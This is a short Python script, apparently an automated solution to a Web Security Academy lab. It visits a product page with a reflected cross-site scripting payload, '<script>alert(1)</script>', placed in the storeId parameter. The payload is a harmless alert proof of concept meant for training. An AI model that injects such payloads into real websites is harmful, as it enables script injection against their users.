from web_security_academy.core.logger import logger


def solve_lab(session):
    xss = "<script>alert(1)</script>"

    path = f"/product?productId=1&storeId={xss}"
    session.get_path(path)
    logger.info(f'Visited path "{path}"')
